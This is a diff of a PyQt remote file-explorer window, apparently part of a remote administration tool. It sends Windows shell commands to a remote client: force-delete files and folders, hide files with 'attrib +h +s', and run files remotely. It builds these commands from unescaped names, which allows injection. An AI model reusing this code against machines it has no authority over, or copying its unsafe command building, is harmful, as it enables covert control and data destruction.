@@ -6,47 +6,33 @@ import os
 import base64
 import string
 import random
-from libs.language import Translate
-
-# Multi Lang
-translate = Translate()
-_ = lambda _word: translate.word(_word)
+from libs.dialogs import message, text
 
 
 def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
 
 
-def sizeof_fmt(num, suffix=_('MEXPLORER_B')):
-            for unit in ['', _('MEXPLORER_K'),
-                         _('MEXPLORER_M'),
-                         _('MEXPLORER_G'),
-                         _('MEXPLORER_T'),
-                         _('MEXPLORER_P'),
-                         _('MEXPLORER_E'),
-                         _('MEXPLORER_Z'),]:
-                if abs(num) < 1024.0:
-                    return "%3.1f%s%s" % (num, unit, suffix)
-                num /= 1024.0
-            return "%.1f%s%s" % (num, 'Yi', suffix)
-
-
 class mainPopup(QWidget, Ui_Form):
     def __init__(self, args):
         QWidget.__init__(self)
         self.setupUi(self)
+        self.anim = QPropertyAnimation(self, 'windowOpacity')
+        self.anim.setDuration(500)
+        self.anim.setStartValue(0)
+        self.anim.setEndValue(1)
+        self.anim.start()
 
-        self.moderator = args['moderator']
+        self.moderat = args['moderat']
         self.client = args['client']
-        self.session_id = args['session_id']
         self.module_id = args['module_id']
-        self.assets = args['assets']
         self.alias = args['alias']
         self.ip_address = args['ip_address']
+        self.p2p = args['p2p']
 
         title_prefix = self.alias if len(self.alias) > 0 else self.ip_address
 
-        self.setWindowTitle(u'[{}] {}'.format(title_prefix, _('MEXPLORER_TITLE')))
+        self.setWindowTitle(u'[{}] {}'.format(title_prefix, self.moderat.MString('MEXPLORER_TITLE')))
 
         self.gui = QApplication.processEvents
 
@@ -62,46 +48,30 @@ class mainPopup(QWidget, Ui_Form):
 
         self.get_content()
 
-        #self.setAcceptDrops(True)
-
     def signal(self, data):
         self.callback(data)
 
+    def send(self, message):
+        self.moderat.send_message(
+            message,
+            'explorerMode',
+            session_id=self.moderat.session_id,
+            _to=self.client,
+            module_id=self.module_id,
+            p2p=self.p2p
+        )
+
     def set_language(self):
-        self.explorerTable.horizontalHeaderItem(0).setText(_('MEXPLORER_TYPE'))
-        self.explorerTable.horizontalHeaderItem(1).setText(_('MEXPLORER_NAME'))
-        self.explorerTable.horizontalHeaderItem(2).setText(_('MEXPLORER_DATE_MODIFIED'))
-        self.explorerTable.horizontalHeaderItem(3).setText(_('MEXPLORER_SIZE'))
-        self.fileLabel.setText(_('MEXPLORER_FILE'))
-        self.dirLabel.setText(_('MEXPLORER_FOLDER'))
-        self.hfileLabel.setText(_('MEXPLORER_HIDDEN_FILE'))
-        self.hdirLabel.setText(_('MEXPLORER_HIDDEN_FOLDER'))
-        self.selectedLabel.setText(_('MEXPLORER_SELECTED'))
-        self.dirfilesLabel.setText(_('MEXPLORER_FOLDERS_FILES'))
-    #
-    # def dragEnterEvent(self, event):
-    #     if event.mimeData().hasUrls:
-    #         event.accept()
-    #     else:
-    #         event.ignore()
-    #
-    # def dragMoveEvent(self, event):
-    #     self.explorerTable.setVisible(False)
-    #     if event.mimeData().hasUrls:
-    #         event.setDropAction(Qt.CopyAction)
-    #         event.accept()
-    #     else:
-    #         event.ignore()
-    #     self.explorerTable.setVisible(True)
-    #
-    # def dropEvent(self, event):
-    #     if event.mimeData().hasUrls:
-    #         event.setDropAction(Qt.CopyAction)
-    #         event.accept()
-    #         for url in event.mimeData().urls():
-    #             self.upload(url.toLocalFile())
-    #     else:
-    #         event.ignore()
+        self.explorerTable.horizontalHeaderItem(0).setText(self.moderat.MString('MEXPLORER_TYPE'))
+        self.explorerTable.horizontalHeaderItem(1).setText(self.moderat.MString('MEXPLORER_NAME'))
+        self.explorerTable.horizontalHeaderItem(2).setText(self.moderat.MString('MEXPLORER_DATE_MODIFIED'))
+        self.explorerTable.horizontalHeaderItem(3).setText(self.moderat.MString('MEXPLORER_SIZE'))
+        self.fileLabel.setText(self.moderat.MString('MEXPLORER_FILE'))
+        self.dirLabel.setText(self.moderat.MString('MEXPLORER_FOLDER'))
+        self.hfileLabel.setText(self.moderat.MString('MEXPLORER_HIDDEN_FILE'))
+        self.hdirLabel.setText(self.moderat.MString('MEXPLORER_HIDDEN_FOLDER'))
+        self.selectedLabel.setText(self.moderat.MString('MEXPLORER_SELECTED'))
+        self.dirfilesLabel.setText(self.moderat.MString('MEXPLORER_FOLDERS_FILES'))
 
     def right_click_menu(self, point):
         self.emenu = QMenu(self)
@@ -110,69 +80,52 @@ class mainPopup(QWidget, Ui_Form):
             # File commands
             if '<FILE>' in _type:
                 pass
-                #self.emenu.addAction(QIcon(os.path.join(self.assets, 'download.png')), _('MEXPLORER_DOWNLOAD'), self.download)
+                #self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'download.png')), self.moderat.MString('MEXPLORER_DOWNLOAD'), self.download)
 
             # Folder commands
             elif '<DIR>' in _type:
                 pass
-                #self.emenu.addAction(QIcon(os.path.join(self.assets, 'open.png')), _('MEXPLORER_OPEN_FOLDER'), self.open_folder)
+                #self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'open.png')), self.moderat.MString('MEXPLORER_OPEN_FOLDER'), self.open_folder)
 
             # Global commands
-            self.emenu.addAction(QIcon(os.path.join(self.assets, 'execute.png')), _('MEXPLORER_EXECUTE'), self.execute_remotely)
-            self.emenu.addAction(QIcon(os.path.join(self.assets, 'set_alias.png')), _('MEXPLORER_RENAME'), self.rename)
-            self.emenu.addAction(QIcon(os.path.join(self.assets, 'eye.png')), _('MEXPLORER_HIDDEN'), self.hidden)
-            self.emenu.addAction(QIcon(os.path.join(self.assets, 'trash.png')), _('MEXPLORER_DELETE'), self.remove)
+            self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'execute.png')), self.moderat.MString('MEXPLORER_EXECUTE'), self.execute_remotely)
+            self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'set_alias.png')), self.moderat.MString('MEXPLORER_RENAME'), self.rename)
+            self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'eye.png')), self.moderat.MString('MEXPLORER_HIDDEN'), self.hidden)
+            self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'trash.png')), self.moderat.MString('MEXPLORER_DELETE'), self.remove)
             self.emenu.addSeparator()
-        except AttributeError:
-            pass
+        except AttributeError as e:
+            print e
 
         # Commands for all
-        self.emenu.addAction(QIcon(os.path.join(self.assets, 'update_source.png')), _('MEXPLORER_REFRESH'), self.refresh)
+        self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'update_source.png')), self.moderat.MString('MEXPLORER_REFRESH'), self.refresh)
         self.emenu.addSeparator()
-        self.emenu.addAction(QIcon(os.path.join(self.assets, 'add_file.png')), _('MEXPLORER_CREATE_FILE'), self.create_file)
-        self.emenu.addAction(QIcon(os.path.join(self.assets, 'add_folder.png')), _('MEXPLORER_CREATE_FOLDER'), self.create_dir)
-        self.emenu.addSeparator()
-        self.emenu.addAction(QIcon(os.path.join(self.assets, 'up.png')), _('MEXPLORER_UPLOAD'), self.upload)
-        self.emenu.addAction(QIcon(os.path.join(self.assets, 'down.png')), _('MEXPLORER_DOWNLOAD'), self.upload)
+        self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'add_file.png')), self.moderat.MString('MEXPLORER_CREATE_FILE'), self.create_file)
+        self.emenu.addAction(QIcon(os.path.join(self.moderat.assets, 'add_folder.png')), self.moderat.MString('MEXPLORER_CREATE_FOLDER'), self.create_dir)
         self.emenu.exec_(self.explorerTable.mapToGlobal(point))
 
     def refresh(self):
         self.get_content()
 
-    def empty(self):
-        pass
-
-    def upload(self):
-        file_name = str(QFileDialog.getOpenFileName(self, _('MEXPLORER_CHOOSE_FILE'), ''))
-        name_of_file = str(file_name).split('\\')[-1].split('/')[-1]
-
-        if file_name and os.path.exists(file_name):
-            with open(file_name, 'rb') as _f:
-                payload = {
-                        'file_name': name_of_file,
-                        'raw_data': base64.b64encode(_f.read())
-                    }
-                self.moderator.send_msg(payload, 'downloadMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
-                self.get_content()
-
-
     def create_file(self):
-        text, ok = QInputDialog.getText(self, _('MEXPLORER_MSG_NEW_FILE'), _('MEXPLORER_MSG_NEW_FILE'), QLineEdit.Normal)
+        ok, value = text.get(self.moderat.MString('MEXPLORER_MSG_NEW_FILE'), self.moderat.MString('MEXPLORER_MSG_NEW_FILE'),
+                             self.moderat.MString('MEXPLORER_MSG_NEW_FILE'), self.moderat.MString('DIALOG_OK'), self.moderat.MString('DIALOG_CANCEL'))
         if ok:
-            self.moderator.send_msg('type Nul > "%s"' % text, 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+            self.send('type Nul > "%s"' % value)
             self.callback = self.recv_content
 
     def create_dir(self):
-        text, ok = QInputDialog.getText(self, _('MEXPLORER_MSG_NEW_FOLDER'), _('MEXPLORER_MSG_NEW_FOLDER'), QLineEdit.Normal)
+        ok, value = text.get(self.moderat.MString('MEXPLORER_MSG_NEW_FOLDER'), self.moderat.MString('MEXPLORER_MSG_NEW_FOLDER'),
+                             self.moderat.MString('MEXPLORER_MSG_NEW_FOLDER'), self.moderat.MString('DIALOG_OK'), self.moderat.MString('DIALOG_CANCEL'))
         if ok:
-            self.moderator.send_msg('mkdir "%s"' % text, 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+            self.send('mkdir "%s"' % value)
             self.callback = self.recv_content
 
     def rename(self):
         target = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()
-        text, ok = QInputDialog.getText(self, _('MEXPLORER_MSG_RENAME'), _('MEXPLORER_MSG_RENAME_WITH'), QLineEdit.Normal, target)
+        ok, value = text.get(self.moderat.MString('MEXPLORER_MSG_RENAME'), self.moderat.MString('MEXPLORER_MSG_RENAME_WITH'),
+                             self.moderat.MString('MEXPLORER_MSG_RENAME_WITH'), self.moderat.MString('DIALOG_OK'), self.moderat.MString('DIALOG_CANCEL'))
         if ok:
-            self.moderator.send_msg('rename %s %s' % (target, text), 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+            self.send('rename {} {}'.format(target, value))
             self.callback = self.recv_content
 
     def hidden(self):
@@ -180,15 +133,15 @@ class mainPopup(QWidget, Ui_Form):
         _file = str(item.text())
         hidden_color = item.textColor().name()
         if hidden_color in ['#3498db', '#9b59b6']:
-            self.moderator.send_msg('attrib -h -s {}'.format(_file), 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+            self.send('attrib -h -s {}'.format(_file))
         else:
-            self.moderator.send_msg('attrib +h +s {}'.format(_file), 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+            self.send('attrib +h +s {}'.format(_file))
         self.callback = self.recv_content
 
     # Execute File Remotely
     def execute_remotely(self):
         _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
-        self.moderator.send_msg('start /d %CD% {}'.format(_file), 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+        self.send('start /d %CD% {}'.format(_file))
         self.callback = self.recv_content
 
     def remove(self):
@@ -196,20 +149,19 @@ class mainPopup(QWidget, Ui_Form):
             _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
             _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
 
-            warn = QMessageBox(QMessageBox.Question, _('MEXPLORER_MSG_CONFIRM'), _('MEXPLORER_MSG_DELETE'))
+            warn = QMessageBox(QMessageBox.Question, self.moderat.MString('MEXPLORER_MSG_CONFIRM'), self.moderat.MString('MEXPLORER_MSG_DELETE'))
             warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
             ans = warn.exec_()
             if ans == QMessageBox.Yes:
                 if '<FILE>' in _type:
-                    self.moderator.send_msg('del /Q "%s"' % _file, 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+                    self.send('del /Q "%s"' % _file)
                 elif '<DIR>' in _type:
-                    self.moderator.send_msg('rmdir /S /Q "%s"' % _file, 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+                    self.send('rmdir /S /Q "%s"' % _file)
                 self.callback = self.recv_content
             else:
                 return
         except AttributeError:
-            warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_MSG_ERROR'), _('MEXPLORER_MSG_NO_FILE'), QMessageBox.Ok)
-            warn.exec_()
+            message.error(self.moderat.MString('MEXPLORER_MSG_ERROR'), self.moderat.MString('MEXPLORER_MSG_NO_FILE'))
 
     # open remote folder
     def open_folder(self):
@@ -220,28 +172,27 @@ class mainPopup(QWidget, Ui_Form):
 
         if '<DIR>' in _type:
             # Choose new folder
-            self.moderator.send_msg('cd %s' % _name, 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+            self.send('cd %s' % _name)
             self.callback = self.recv_content
 
     # open remote folder from path entry
     def open_path(self):
-        self.moderator.send_msg('cd %s' % str(self.explorerPathEntry.text()), 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+        self.send('cd {}'.format(str(self.explorerPathEntry.text())))
         self.callback = self.recv_content
 
     # open parent folder
     def parent_folder(self):
-        self.moderator.send_msg('cd ..', 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+        self.send('cd ..')
         self.callback = self.recv_content
 
     # Change Drive
     def drive_change(self):
         if not self.comboInEditMode:
-            self.moderator.send_msg('cd ' + str(self.explorerDrivesDrop.itemText(self.explorerDrivesDrop.currentIndex())),
-                       'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+            self.send('cd ' + str(self.explorerDrivesDrop.itemText(self.explorerDrivesDrop.currentIndex())))
             self.callback = self.recv_content
 
     def get_content(self):
-        self.moderator.send_msg('getContent', 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
+        self.send('getContent')
         self.callback = self.recv_content
 
     def recv_content(self, data):
@@ -249,8 +200,7 @@ class mainPopup(QWidget, Ui_Form):
         try:
             content = ast.literal_eval(data['payload'])
         except (SyntaxError, ValueError):
-            warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_OPEN_FOLDER_ERROR'), _('MEXPLORER_OPEN_FOLDER_ERROR'))
-            warn.exec_()
+            message.error(self.moderat.MString('MEXPLORER_OPEN_FOLDER_ERROR'), self.moderat.MString('MEXPLORER_OPEN_FOLDER_ERROR'))
             return
         # Init Logical Drives
         self.comboInEditMode = True
@@ -285,14 +235,14 @@ class mainPopup(QWidget, Ui_Form):
 
             if content[index]['hidden']:
                 file_color = QColor('#9b59b6')
-                file_icon = os.path.join(self.assets, 'hidden_file.png')
+                file_icon = os.path.join(self.moderat.assets, 'hidden_file.png')
                 folder_color = QColor('#3498db')
-                folder_icon = os.path.join(self.assets, 'hidden_folder.png')
+                folder_icon = os.path.join(self.moderat.assets, 'hidden_folder.png')
             else:
                 file_color = QColor('#ecf0f1')
-                file_icon = os.path.join(self.assets, 'file.png')
+                file_icon = os.path.join(self.moderat.assets, 'file.png')
                 folder_color = QColor('#e67e22')
-                folder_icon = os.path.join(self.assets, 'folder.png')
+                folder_icon = os.path.join(self.moderat.assets, 'folder.png')
 
             # set content type
             item = QTableWidgetItem('<FILE>') if content[index]['type'] else QTableWidgetItem('<DIR>')
@@ -324,7 +274,7 @@ class mainPopup(QWidget, Ui_Form):
             self.explorerTable.setItem(index, 2, item)
 
             # set file size
-            item = QTableWidgetItem(sizeof_fmt(content[index]['size'])) if content[index]['type'] else QTableWidgetItem('')
+            item = QTableWidgetItem(self.sizeof_fmt(content[index]['size'])) if content[index]['type'] else QTableWidgetItem('')
             item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
             item.setTextColor(file_color)
             self.explorerTable.setItem(index, 3, item)
@@ -336,5 +286,19 @@ class mainPopup(QWidget, Ui_Form):
         # set folders & files count
         self.dirfilesCountLabel.setText('{0}/{1}'.format(folder_count, file_count))
 
+    def sizeof_fmt(self, num):
+        suffix = self.moderat.MString('MEXPLORER_B')
+        for unit in ['', self.moderat.MString('MEXPLORER_K'),
+                     self.moderat.MString('MEXPLORER_M'),
+                     self.moderat.MString('MEXPLORER_G'),
+                     self.moderat.MString('MEXPLORER_T'),
+                     self.moderat.MString('MEXPLORER_P'),
+                     self.moderat.MString('MEXPLORER_E'),
+                     self.moderat.MString('MEXPLORER_Z'), ]:
+            if abs(num) < 1024.0:
+                return "%3.1f%s%s" % (num, unit, suffix)
+            num /= 1024.0
+        return "%.1f%s%s" % (num, 'Yi', suffix)
+
     def closeEvent(self, QCloseEvent):
-        self.moderator.send_msg(self.module_id, 'terminateProcess', session_id=self.session_id, _to=self.client)
+        self.send(self.module_id)
